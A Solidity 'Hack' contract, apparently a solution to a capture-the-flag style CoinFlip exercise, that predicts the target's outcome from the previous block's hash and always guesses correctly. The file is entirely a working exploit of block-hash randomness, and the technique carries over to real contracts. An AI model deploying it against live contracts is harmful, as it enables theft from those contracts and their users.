// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

// Interface for the CoinFlip contract.
interface CCoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool) external returns (bool);
}

// Hack contract to exploit the CoinFlip contract.
contract Hack {
    // Immutable reference to the target CoinFlip contract.
    CCoinFlip private immutable target;
    // Constant factor for calculating the coin flip outcome.
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Constructor to set the target CoinFlip contract.
    constructor(address _target) {
        target = CCoinFlip(_target);
    }

    // Flip function to be called 10 times to exploit the target contract.
    function flip() external {
        // Generate a guess using the private _guess function.
        bool guess = _guess();
        // Call the target CoinFlip contract's flip function with the generated guess.
        require(target.flip(guess), "guess failed");
    }

    // Internal function to generate a guess based on the block hash.
    function _guess() private view returns (bool) {
        // Obtain the hash of the previous block.
        uint256 blockValue = uint256(blockhash(block.number - 1));
        // Calculate the coin flip outcome.
        uint256 coinFlip = blockValue / FACTOR;
        // Return true if the outcome is 1, otherwise false.
        return coinFlip == 1;
    }
}
